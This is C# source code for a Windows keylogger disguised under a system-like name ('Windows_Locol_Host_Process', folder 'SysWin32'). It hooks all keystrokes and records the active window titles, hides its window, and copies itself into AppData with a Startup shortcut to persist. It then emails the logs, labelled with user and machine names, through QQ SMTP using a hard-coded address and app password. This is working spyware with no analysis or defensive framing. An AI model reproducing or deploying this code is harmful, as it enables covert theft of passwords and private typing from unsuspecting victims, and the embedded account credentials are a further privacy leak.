using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using IWshRuntimeLibrary;


namespace Windows_Locol_Host_Process
{

    public partial class Form1 : Form
    {
        private static Button btn;
        private static TextBox txb;
        private static string appname = "";
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        // You have to modify these to actual addresses and password
        private const string senderEmail = "3288593638@qq.com";
        private const string receiverEmail = "3288593638@qq.com";
        private const string senderPassword = "ikutbipcoklxcihf";

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        // 0 to hide, 1 to show
        const int SW_HIDE = 0;

        static int numChar = 0;

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern IntPtr GetForegroundWindow();
        //获取当前窗口句柄

        [DllImport("user32.dll")]
        public static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int nMaxCount);




        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                //Write to console and to file
                //btn.Text = ((Keys)vkCode).ToString();
                
                writeLetter((Keys)vkCode);


            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        /// <summary>
        ///     Method used to copy the executable to user's appdata and make it launch at startup
        /// </summary>
        private void init()
        {
            string myPath = Application.ExecutablePath;
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string copyPath = appData + @"\SysWin32\" + Path.GetFileName(myPath);

            Directory.CreateDirectory(appData + @"\SysWin32\");
            Directory.CreateDirectory(appData + @"\SysWin32\logs\");


        }

        /// <summary>
        ///     Method used to send logs via mail
        /// </summary>
        /// <param name="logs">The content of a log to send.</param>
        /// <param name="sender">Sender's email address</param>
        /// <param name="receiver">Receiver's email address</param>
        /// <param name="password">Password of the sender's email account</param>
        /// <param name="filename">Name of the log file</param>
        private static void sendMail(string logs, string sender, string receiver, string password, string filename)
        {
            // Assign variables
            var fromAddress = new MailAddress(sender, "From Sender");
            var toAddress = new MailAddress(receiver, "To Receiver");
            string fromPassword = password;
            string subject = filename;
            string body = logs;

            // Create an SMTP Client object and instantiate its properties 
            var smtp = new SmtpClient
            {
                Host = "smtp.openmailbox.org",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
            };

            // Create the message to send
            var message = new MailMessage(fromAddress, toAddress)
            {
                Subject = subject,
                Body = body,
            };

            // Send the message
            smtp.Send(message);


        }

        protected static void sendMail2(string logs, string sender, string receiver, string password, string filename)
        {
            MailMessage msg = new MailMessage();

            msg.To.Add(receiver);
            msg.CC.Add(sender);

            msg.From = new MailAddress(sender, "test");

            msg.Subject = filename;//标题
                                   //标题格式为UTF8  
            msg.SubjectEncoding = Encoding.UTF8;

            msg.Body = logs;//邮箱内容

            //内容格式为UTF8 
            msg.BodyEncoding = Encoding.UTF8;

            SmtpClient client = new SmtpClient();
            //SMTP服务器地址 
            client.Host = "smtp.qq.com";
            //SMTP端口，QQ邮箱填写587  
            client.Port = 587;
            //启用SSL加密  
            client.EnableSsl = true;

            client.Credentials = new NetworkCredential(sender, password);
            //发送邮件  
            try
            {
                client.Send(msg);
            }
            catch (SmtpException ex)
            {

            }
            finally
            {
                client.Dispose();
                msg.Dispose();
            }
        }

        /// <summary>
        ///     Method used to write the key received to the log file
        /// </summary>
        /// <param name="key">The key typed on the keyboard</param>
        /// This method should be activated for each and every keystrokes the user type.
        private static void writeLetter(Keys key)
        {



            // Start writing to a file
            StreamWriter sw = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\SysWin32\log.txt", true);

            // Create aliases for special characters to render properly in the logs
            var specialKeys = new Dictionary<string, string>()
            {
                //{"Back", " *back* "},
                //{"Delete", " *delete* "},
                //{"Return", "\n"},
                //{"Space", " "},
                //{"Add", "+"},
                //{"Subtract", "-"},
                //{"Divide", "/"},
                //{"Multiply", "*"},
                //{"Up", " *up* "},
                //{"Down", " *down* "},
                //{"Left", " *left* "},
                //{"Capital", " *caps* "},
                //{"Tab", " *tabs* "},
                //{"LShiftKey", " ^ "},
                //{"RShiftKey", " ^ "},
                //{"Oemcomma", ","},
                //{"OemPeriod", "."}
            };

            //写入当前焦点的程序名，如果不同，就写入log
            IntPtr hWnd = GetForegroundWindow();
            int length = GetWindowTextLength(hWnd);
            StringBuilder windowName = new StringBuilder(length + 1);
            GetWindowText(hWnd, windowName, windowName.Capacity);
            if (!appname.Equals(windowName.ToString()))
            {
                Console.WriteLine(windowName);
                sw.WriteLine("");
                sw.WriteLine(windowName);
                appname = windowName.ToString();
            }

            // Write the key (or its alias) to the file
            if (specialKeys.ContainsKey(key.ToString()))
            {
                sw.Write("<" + specialKeys[key.ToString()] + ">");
            }
            else
            {
                sw.Write("<" + key.ToString().ToLower() + ">");
            }

            // Write a new line each 50 characters
            //numChar += 1;
            //if (numChar == 50)
            //{
            //    sw.WriteLine("");
            //    numChar = 0;
            //}

            // Close the connection to the file
            sw.Close();

        }

        /// <summary>
        ///     This method creates a shortcut
        /// </summary>
        /// <param name="shortcutName">The name of the shortcut</param>
        /// <param name="shortcutPath">The location of the shortcut</param>
        /// <param name="targetFileLocation">What should be linked</param>
        /// Require "using IWshRuntimeLibrary;", and a reference to Windows Script Host Model
        public static void createShortcut(string shortcutName, string shortcutPath, string targetFileLocation)
        {
            string shortcutLocation = System.IO.Path.Combine(shortcutPath, shortcutName + ".lnk");
            WshShell shell = new WshShell();
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutLocation);

            shortcut.Description = "Keys";
            shortcut.TargetPath = targetFileLocation;
            shortcut.Save();
        }

        public static bool checkInternet()
        {
            try
            {
                using (var client = new WebClient())
                {
                    using (var stream = client.OpenRead("http://www.baidu.com"))
                    {
                        return true;
                    }
                }
            }
            catch
            {
                return false;
            }
        }
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

            btn = button2;
            txb = textBox1;
            string myPath = Application.ExecutablePath;
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string copyPath = appData + @"\SysWin32\" + Path.GetFileName(myPath);

            textBox1.Text = myPath + "\n\n" + copyPath;
            if (myPath.Equals(copyPath))
            {
                button2.Text = "运行中";
                // start hooking keyboard
                _hookID = SetHook(_proc);

                //这里在启动后隐藏自己
                this.BeginInvoke(new Action(() => {
                    this.Hide();
                }));
            }

            // Maintain access (startup folder and %appdata%)
            init();

            //这里取消透明，本来窗体是透明的，以此防止闪一下
            this.BeginInvoke(new Action(() =>
            {
                this.Opacity = 1;
            }));

        }

        private void button1_Click(object sender, EventArgs e)
        {
            string myPath = Application.ExecutablePath;
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string copyPath = appData + @"\SysWin32\" + Path.GetFileName(myPath);
            if (!System.IO.File.Exists(copyPath))
            {
                System.IO.File.Copy(myPath, copyPath);
                createShortcut("SysWin32", startupPath, copyPath);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (_hookID.Equals(IntPtr.Zero))
            {
                button2.Text = "运行中";
                // start hooking keyboard
                _hookID = SetHook(_proc);
                this.Hide();
            }
            else
            {
                button2.Text = "已暂停";
                UnhookWindowsHookEx(_hookID);
                _hookID = IntPtr.Zero;
            }
            
        }

        private void record_Tick(object sender, EventArgs e)
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            //Send log via email when it reaches a certain weight.
            FileInfo logFile = new FileInfo(appData + @"\SysWin32\log.txt");
            if (logFile.Exists && logFile.Length > 10000 && checkInternet())
            {
                string filename = "log_" + Environment.UserName + "@" + Environment.MachineName + "_" + DateTime.Now.ToString(@"MM_dd_yyyy_hh\hmm\mss") + ".txt";
                sendMail2(System.IO.File.ReadAllText(logFile.ToString()), senderEmail, receiverEmail, senderPassword, filename);
                logFile.MoveTo(appData + @"\SysWin32\logs\" + filename);
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (!_hookID.Equals(IntPtr.Zero))
            {
                button2.Text = "已暂停";
                UnhookWindowsHookEx(_hookID);
                _hookID = IntPtr.Zero;
            }
        }
    }
}
